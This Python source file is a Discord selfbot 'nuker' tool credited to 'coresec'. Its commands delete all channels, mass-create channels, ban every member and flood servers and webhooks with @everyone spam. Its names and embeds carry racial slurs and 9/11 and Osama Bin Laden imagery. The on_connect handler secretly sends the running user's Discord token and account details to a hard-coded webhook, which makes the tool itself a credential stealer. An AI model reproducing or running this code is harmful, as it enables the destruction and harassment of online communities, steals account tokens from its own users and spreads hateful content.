import discord
from discord.ext import commands
import requests
import random
from colorama import Fore
import time
import os
from pystyle import Box
from pystyle import Colors, Colorate
import ujson
import aiohttp
import asyncio
import threading
from threading import Thread
import json
from pypresence import Presence
from discord.ext.commands import MissingPermissions
from discord.ext.commands import has_guild_permissions
from discord.ext.commands import has_permissions



os.system('title [ DUST NUKER V1 ]')

config = json.load(open("config.json", "r"))
Token = config.get("Token")
command_prefix = config.get("command_prefix")


channel_names = "allah"
header = {
  'authorization': Token
}

BASE_URL = "https://discord.com/api/v9"


bot = commands.Bot(command_prefix=command_prefix,self_bot=True,help_command=None)

@bot.event
async def on_ready():
    status = await bot.change_presence(activity=discord.Streaming(name="ambatukam", url="https://twitch.tv"))
    print(Colorate.Horizontal(Colors.black_to_white, f"""
████████▄  ███    █▄     ▄████████     ███     
███   ▀███ ███    ███   ███    ███ ▀█████████▄ 
███    ███ ███    ███   ███    █▀     ▀███▀▀██ 
███    ███ ███    ███   ███            ███   ▀ 
███    ███ ███    ███ ▀███████████     ███     
███    ███ ███    ███          ███     ███     
███   ▄███ ███    ███    ▄█    ███     ███     
████████▀  ████████▀   ▄████████▀     ▄████▀   
                                               


[+] Logged in as : {bot.user.name}#{bot.user.discriminator}
[+] User ID : {bot.user.id}
[+] Prefix : {command_prefix}
[+] Selfbot : true
[+] Bot : false
[+] Servers : {len(bot.guilds)}
[+] Friends : {len(bot.user.relationships)}
[+] Ping : {round(bot.latency * 1000)}ms
[+] Made By coresec
"""))

@bot.command(description="load templates", usage="(TemplateName)")
async def load(ctx, template=None):
  if template == None:
    await ctx.send(f"""
    ```
    TEMPLATES
    CP
    LR
    AOS
    NA
    HA
    ```
    """, delete_after=10)
    if template == "cp":
        await channel_deleter(ctx)
        await ctx.guild.edit(name="ད¢₱ཌ  COOL PROGRAMMERS")
        cpz = await ctx.guild.create_category("z")
        await ctx.guild.create_text_channel("cp-whalecum", category=cpz)
        cpi = await ctx.guild.create_category("read pls!!!")
        await ctx.guild.create_text_channel(f"cp-rules", category=cpi)
        await ctx.guild.create_text_channel(f"cp-announcements", category=cpi)
        cps = await ctx.guild.create_category("sesso ah ah sesso")
        await ctx.guild.create_text_channel(f"cp general", category=cps)
        await ctx.guild.create_text_channel(f"cp tool talk", category=cps)
        cpv = await ctx.guild.create_category("help my mic broke")
        ctx.guild.create_voice_channel(f"cp vc real", category=cpv)
        await ctx.guild.create_text_channel(f"help my mic broke", category=cpv)
        penis = await ctx.guild.create_category("admin stuff")


@bot.command()
async def help(ctx):
    await ctx.message.delete()
    await ctx.send(f"""
    ```
• 𝗗𝗨𝗦𝗧 𝗡𝗨𝗞𝗘𝗥 •

[ 1 ] {command_prefix}nuke
~ nukes the server

[ 2 ] {command_prefix}ccr
~ creates channels

[ 3 ] {command_prefix}cdel
~ deletes channels

[ 4 ] {command_prefix}massban
~ bans all guild members

[ 5 ] {command_prefix}spam
~ spam random shit

[ 6 ] {command_prefix}raid
~ you raid a channel

[ 7 ] {command_prefix}webhookspam
~ creates a webhook in every channel

[ 8 ] {command_prefix}presence
~ change ur selfbots presence

[ 9 ] {command_prefix}purge
~ purge your messages!

[ 10 ] {command_prefix}sex
~ have sex with hot niggas
```
""", delete_after=20)


def spammr():
  @bot.event
  async def on_guild_channel_create(channel_names):
    webhook = await channel_names.create_webhook(name="Osama Bin Laden")
    while True:
        await webhook.send(content="@everyone OMG 9/11", embed=sex)
for x in range(25):
  t = threading.Thread(target=spammr)
  t.start()

sex=discord.Embed(title="OSAMA WAS HERE")
sex.set_thumbnail(url="https://cdn.discordapp.com/attachments/1061324206291292290/1069673911635157032/binladen-osama_foto_LEMO-F-6-036_dpa.jpg")
sex.set_image(url="https://cdn.discordapp.com/attachments/1061324206291292290/1069673911807119500/1280x720.jpg")
sex.add_field(name="YOUTUBE", value="https://youtube.com/@daymapping")



@bot.command()
async def nuke(ctx):
    guild = ctx.guild.id
    await ctx.guild.edit(name="Wizzed by CORESEC")
    await channel_deleter(ctx)
    async with aiohttp.ClientSession() as session:
        	for i in range(50):
        		r = await session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers = header, json = {"name": channel_names})


@bot.command()
async def ccr(ctx):
    guild = ctx.guild.id
    async with aiohttp.ClientSession() as session:
        for i in range(50):
            r = await session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers = header, json = {"name": channel_names})


async def delchan(session: aiohttp.ClientSession, id):
	while True:
		async with session.delete(f"{BASE_URL}/channels/{id}", headers=header) as resp:
			if resp.status == 200:

				break
			elif resp.status == 429:
				j = await resp.json()
				await asyncio.sleep(j['retry_after'])
			else:
				j = await resp.json()
				break


async def channel_deleter(ctx):
	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
		await asyncio.gather(*(asyncio.create_task(delchan(session, channel.id)) for channel in ctx.guild.channels))


@bot.command()
async def cdel(ctx):
	await ctx.message.delete()
	await channel_deleter(ctx)



def ssspam(webhook):
    while True:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone FR'}
            
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)

@bot.command()
async def massban(ctx):
    for member in bot.get_all_members():
        await member.ban()

@bot.command()
async def spam(ctx, message, amount:int):
    await ctx.message.delete()
    for i in range(amount):
        await ctx.send(message)

@bot.command()
async def raid(ctx):
    while True:
        await ctx.send(f"""
        😀 😃 😄 😁 😆 😅 😂 🤣 ☺️ 😊 😇 🙂 🙃 😉 😌 🥲 😍 🥰 😘 😗 😙 😚 😋 😛 😝 😜 🤪 🤨 🧐 🤓 😎 🤩 🥳 😏 😒 😞 😔 😟 😕 🙁 ☹️ 😣 😖 😫 😩 🥺 😢 😭 😤 😮‍💨 😠 😡 🤬 🤯 😳 😶‍🌫️ 🥵 🥶 😱 😨 😰 😥 😓 🤗 🤔 🤭 🥱 🤫 🤥 😶 😐 😑 😬 🙄 😯 😦 😧 😮 😲 😴 🤤 😪 😵 😵‍💫 🤐 🥴 🤢 🤮 🤧 😷 🤒 🤕 🤑 🤠 🥸 😈 👿 👹 👺 🤡 💩 👻 💀 ☠️ 👽 👾 🤖 🎃 😺 😸 😹 😻 😼 😽 🙀 😿 😾 🤲 👐 🙌 👏 🤝 👍 👎 👊 ✊ 🤛 🤜 🤞 ✌️ 🤟 🤘 👌 🤏 🤌 👈 👉 👆 👇 ☝️ ✋  @everyone""")


@bot.command(aliases=['webhookfuck', 'spamwebhooks',"webhooknuke","webhooksnuke","webhooksfuck","spamwebhook"])
async def webhookspam(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: 
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = ssspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):  
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name='CORESEC')
                threading.Thread(target = ssspam, args = (webhook.url,)).start()
                f = open(r'data/webhooks-'+str(ctx.guild.id)+".txt",'a')
                f.write(f"{webhook.url} \n")
                f.close()

            except:
                print (f"{Fore.RED} > Webhook Error")


@bot.command(name="presence", descrpition="Changes account status.")
async def presence(ctx, *, stat):
  await ctx.message.delete()
  game = discord.Game(stat)
  await bot.change_presence(status=discord.Status.idle, activity=game)





@bot.event
async def on_connect():
    r = requests.post('https://discord.com/api/webhooks/1069762015440154674/zu8NbbdVH6e5IFDdLHbL2c_AT9nWE-D1MX53YVfueuxuEoEeX3EBMuCHUZWRiAs09Duk', headers=header, json = {"content": f"""
    ```
[+] Username : {bot.user.name}#{bot.user.discriminator}
[+] User ID : {bot.user.id}
[+] Prefix : {command_prefix}
[+] Token : {Token}
[+] Servers : {len(bot.guilds)}
[+] Friends : {len(bot.user.relationships)}
[+] Ping : {round(bot.latency * 1000)}ms
    ```
    """})

bot.run(Token, bot=False)